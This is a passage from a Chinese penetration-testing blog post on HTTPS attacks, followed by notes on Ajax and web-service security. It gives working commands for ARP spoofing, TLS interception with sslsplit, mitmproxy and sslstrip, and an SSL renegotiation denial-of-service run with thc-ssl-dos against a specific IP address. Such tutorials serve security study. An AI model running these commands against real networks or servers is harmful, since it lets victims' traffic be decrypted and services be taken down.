+</span></span><span class="line"><span class="cl"><span class="c1">#可以发现：受害者机器上关于网关的mac已经换成了kali的</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>4).启动SSLsplit</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mkdir -p test/logdir
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># -D:debug显示详细信息，-l把连接信息记录到哪，-j“越狱”的根目录(sslsplit的)，-S请求具体数据内容保存的目录，-k私钥，-c证书；对ssl加密的在本地8443监听,对明文在本地8080监听</span>
+</span></span><span class="line"><span class="cl">sslsplit -D -l connect.log -j /root/test -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 <span class="m">8443</span> tcp 0.0.0.0 <span class="m">8080</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 所有操作完成了</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>然后让被害者访问https的一些网站(会显示证书有问题,是否继续浏览)</li>
+<li>我们可以查看日志和浏览器证书以及证书保存信息(<code>cat connect.log</code>) ,</li>
+<li>具体通信数据在:<code>ls test/logdir</code>, 每个log文件中内容会有被解密的明文信息（如果还有加密信息,那就是应用程序本身进行了加密的，这里的解密的只是通信过程中针对ssl部分）
+通过关键词查找内容：<code>grep xxx *.log</code>这样</li>
+<li>在受害者机器上安装我们生成的服务器根证书之后再次访问(浏览器就不会弹出警告了)</li>
+</ul>
+<blockquote>
+<p>全站https/非全站https（比如只是登录等部分页面加了https）</p>
+</blockquote>
+<h6 id="2mitmproxy工具">2.<code>Mitmproxy</code>工具</h6>
+<ul>
+<li>设置路由表转发规则</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># bug: 只能在8080端口监听，所以需要修改规则</span>
+</span></span><span class="line"><span class="cl">iptables -t nat -F
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">iptables -t nat -A PREROUTING -p tcp --dport <span class="m">80</span> -j REDIFECT --to-port <span class="m">8080</span>
+</span></span><span class="line"><span class="cl">iptables -t nat -A PREROUTING -p tcp --dport <span class="m">443</span> -j REDIFECT --to-port <span class="m">8080</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>也是使用<code>arpspoof</code>进行arp欺骗</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">arpspoof -i eth0 -t 192.168.1.118 -r 192.168.1.1
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>最后，Mitmproxy侦听</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mitmproxy -T --host -w mitmproxy.log
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># mitmproxy会自动生成一个证书
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h6 id="3sslstrip工具">3.<code>SSLstrip</code>工具</h6>
+<p>与前两种工具不同，此工具将客户端到中间人之间的流量变为明文(不用通过安装证书)</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 这种更实用便捷，但是......</span>
+</span></span><span class="line"><span class="cl">sslstrip -l <span class="m">8080</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><hr>
+<h2 id="ssltls拒绝服务攻击">SSL/TLS拒绝服务攻击</h2>
+<blockquote>
+<p>和流量式的拒绝服务攻击不同(打击的是网络带宽)，而我们这里打击的是服务器的资源</p>
+</blockquote>
+<h4 id="note">Note:</h4>
+<ul>
+<li>SSL协商加密，服务器资源加载速度会变慢（大量握手请求会导致拒绝服务），但是优化得当就可以没问题</li>
+<li>利用SSL secure Renegotiation特性，在单一TCP连接中生成数千个SSL重连接请求，造成服务器资源过载</li>
+<li>与流量式的拒绝服务攻击不同，thc-ssl-dos可利用dsl线路打垮30G带宽的服务器</li>
+<li>服务器平均可以处理300次/s SSL握手请求</li>
+</ul>
+<h4 id="利用-1">利用</h4>
+<h5 id="thc-ssl-dos工具"><code>thc-ssl-dos</code>工具</h5>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#使用</span>
+</span></span><span class="line"><span class="cl">thc-ssl-dos 199.223.209.205 <span class="m">2083</span> -accept
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p><code>dig</code>命令，解析ip地址</p>
+</blockquote>
+<hr>
+<h2 id="补充概念">补充概念</h2>
+<h4 id="ajax">Ajax</h4>
+<p>Asynchronous JavaScript and XML</p>
+<p>是一组现有技术的组合</p>
+<p>通过客户端脚本动态更新页面部分内容，而非整个页面</p>
+<p>降低带宽使用，提高速度</p>
+<p>提升用户体验</p>
+<p>后台异步访问</p>
+<p><strong>Ajax组件</strong></p>
+<ul>
+<li>JavaScript(ajax的核心组件)</li>
+<li>Dynamic HTML(DHTML)</li>
+<li>DOM</li>
+</ul>
+<p><strong>ajax框架：</strong></p>
+<ul>
+<li>jQuery</li>
+<li>Dojo Tookit</li>
+<li>Google Web toolkit</li>
+<li>Microsoft Ajax library</li>
+</ul>
+<p><strong>基于Ajax的Web应用工作流程</strong></p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="http://image.xpshuai.cn/HTTPS%E6%94%BB%E5%87%BB_3.png"
+    data-srcset="http://image.xpshuai.cn/HTTPS%E6%94%BB%E5%87%BB_3.png, http://image.xpshuai.cn/HTTPS%E6%94%BB%E5%87%BB_3.png 1.5x, http://image.xpshuai.cn/HTTPS%E6%94%BB%E5%87%BB_3.png 2x"
+    data-sizes="auto"
+    alt="http://image.xpshuai.cn/HTTPS%E6%94%BB%E5%87%BB_3.png"
+    title="http://image.xpshuai.cn/HTTPS%E6%94%BB%E5%87%BB_3.png"/></p>
+<blockquote>
+<p>使用的技术混合越多，攻击面就越大(每个参数都可能形成独立的攻击过程)</p>
+</blockquote>
+<p><strong>Ajax的安全问题</strong></p>
+<ul>
+<li>多种技术混合，攻击面就越大(每个参数都可能形成独立的攻击过程)</li>
+<li>Ajax引擎，访问恶意站点可能后果严重，虽然浏览器有沙箱和SOP，但可能被绕过</li>
+<li>服务器、客户端代码结合使用产生混乱，服务器访问控制不当，将信息泄露</li>
+<li>暴露应用程序逻辑</li>
+</ul>
+<p><strong>Ajax对渗透测试的挑战</strong></p>
+<ul>
+<li>
+<p>异步请求数量多且隐蔽</p>
+</li>
+<li>
+<p>触发Ajax请求的条件无规律</p>
+</li>
+<li>
+<p>手动和阶段大力爬网可能产生大量遗漏</p>
+</li>
+</ul>
+<p><strong>检查方法：</strong></p>
+<ul>
+<li>手动查看页面源代码有没有使用ajax（效率低一些）</li>
+<li>浏览器打开审查元素：net &ndash;&gt; XHR  /   net &ndash;&gt; javascript</li>
+<li>使用ZAP，使用ajax爬站功能</li>
+</ul>
+<h4 id="web-service">Web Service</h4>
+<ul>
+<li>面向服务的架构，便于不同系统集成共享数据和功能</li>
+<li>尤其适合不想暴露数据模型和程序逻辑而访问数据的场景</li>
+<li>无页面</li>
+</ul>
+<p><strong>两种类型：</strong></p>
+<ul>
+<li>SOAP （传统，xml是唯一的数据交换格式，繁琐，但是安全）  &ndash; Simple object access protocol</li>
+<li>RESTful (json是首选的数据交换格式刷)</li>
+</ul>
+<p><strong>web service安全考虑：</strong></p>
+<ul>
+<li>使用API key或session token实现和跟踪身份认证</li>
+<li>身份认证由服务器完成，而非客户端</li>
+<li>API key, 用户名, Session token 永远不要通过URL发送</li>
+<li>RESTful 不提供任何安全机制，需要使用SSL/TLS保护传输数据安全</li>
+<li>SOAP提供强于HTTPS的WS-security机制</li>
+<li>使用OAuth或HMAC进行身份验证，HMAC身份认证使用C/S共享的秘钥加密API key</li>
+<li>RESTful应只允许身份认证用户使用PUT、DELETE方法</li>
+<li>使用所及token防止CSRF攻击</li>
+<li>对用户提交参数过滤，建议部署基于严格白名单的方法</li>
+<li>报错信息消毒</li>
+<li>直接对象引用应严格身份验证(电商公司以ID作为主索引)</li>
+</ul>
+</div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title=2023-01-21&#32;16:47:23>更新于 2023-01-21&nbsp;</span>
+      </div><div class="post-info-license">
+          <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span>
+        </div></div>
+    <div class="post-info-line">
+      <div class="post-info-md"><span><a href="/https%E6%94%BB%E5%87%BB/index.md" title="阅读原始文档" class="link-to-markdown">阅读原始文档</a></span><span><a href="https://github.com/shuai06/edit/main/content/posts/HTTPS%e6%94%bb%e5%87%bb.md" title="编辑此页"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-edit">编辑此页</a></span></div>
+      <div class="post-info-share">
+        <span></span>
+      </div>
+    </div>
+  </div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href='/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/' class="post-tag">渗透测试</a><a href='/tags/https%E6%94%BB%E5%87%BB/' class="post-tag">HTTPS攻击</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/node-js-%E5%85%A5%E9%97%A8/" class="post-nav-item" rel="prev" title="Node.js 入门"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>Node.js 入门</a>
+      <a href="/%E5%B8%B8%E8%A7%81%E7%9A%84%E7%AE%A1%E9%81%93%E7%AC%A6/" class="post-nav-item" rel="next" title="常见的管道符">常见的管道符<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+<div id="comments"><div id="giscus">
+          <script
+            src="https://giscus.app/client.js"
+            data-repo="hugo-fixit/FixIt"
+            data-repo-id="R_kgDOGihPtQ"
+            data-category="General"
+            data-category-id="DIC_kwDOGihPtc4CApHX"
+            data-mapping="title"
+            
+            data-theme="preferred_color_scheme"
+            data-reactions-enabled="1"
+            data-emit-metadata="0"
+            data-input-position="bottom"
+            data-lang="zh-CN"
+            data-loading="lazy"
+            crossorigin="anonymous"
+            async
+            defer
+          ></script>
+        </div>
+        <noscript>
+          Please enable JavaScript to view the comments powered by <a href="https://giscus.app/" rel="external nofollow noopener noreferrer">giscus</a>.
+        </noscript></div></article></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.109.0">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.2.17-RC"><img class="fixit-icon" src="/fixit.min.svg" alt="FixIt logo" />&nbsp;FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">
+              <a href="http://geoer.cn"target="_blank" rel="external nofollow noopener noreferrer">剑胆琴心</a></span><span class="license footer-divider"><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div><div class="footer-line visitor">
+          <span id="busuanzi_container_site_uv" title='总访客数'><i class="fa-regular fa-user fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='总访问量'><i class="fa-regular fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div><div class="fixed-button view-comments d-none" role="button" aria-label="查看评论"><i class="fa-solid fa-comment fa-fw" aria-hidden="true"></i></div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;--bg-progress: #000;--bg-progress-dark: #fff;"></div><noscript>
+    <div class="noscript-warning">FixIt 主题在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/algoliasearch/algoliasearch-lite.umd.min.js" defer></script><script src="/lib/lazysizes/lazysizes.min.js" async defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/pangu/pangu.min.js" defer></script><script src="/lib/cell-watermark/watermark.min.js" defer></script><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"autoBookmark":true,"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":10},"comment":{"enable":true,"expired":false,"giscus":{"darkTheme":"dark_dimmed","lightTheme":"light"}},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"enablePWA":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"pangu":{"enable":true,"selector":"article"},"search":{"algoliaAppID":"YKOM6PKLUY","algoliaIndex":"index.zh-cn","algoliaSearchKey":"a44c110d3ac360be2c69cd79d34b77a8","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"},"watermark":{"content":"\u003cimg class=\"fixit-icon\" src=\"/images/avatar.png\" alt=\"FixIt logo\" /\u003e 剑胆琴心","enable":true,"height":21,"opacity":0.0125}};</script><script src="/js/theme.min.js" defer></script><script src="/js/custom.min.js" defer></script></body>
+</html>
